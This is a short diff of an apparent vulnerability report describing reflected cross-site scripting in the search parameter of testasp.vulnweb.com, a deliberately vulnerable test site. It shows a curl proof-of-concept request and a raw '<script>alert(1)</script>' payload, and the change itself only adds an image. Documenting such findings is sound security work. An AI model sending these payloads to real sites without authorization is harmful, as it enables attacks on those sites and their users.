@@ -77,6 +77,12 @@ curl -v "http://testasp.vulnweb.com/Search.asp?Search=%3Cscript%3Ealert(1)%3C%2F
 User-supplied input from the search parameter is rendered into the HTML response without proper context-sensitive encoding. HTML special characters (<, >, &, ", ') are not escaped, so injected markup is executed by the browser.
 
 
+
+![Image](https://github.com/user-attachments/assets/7a7bde0c-d97e-486e-961a-6b31a24584fb)
+
+
+
+
 7.Raw payloads & commands:
 
 <script>alert(1)</script>
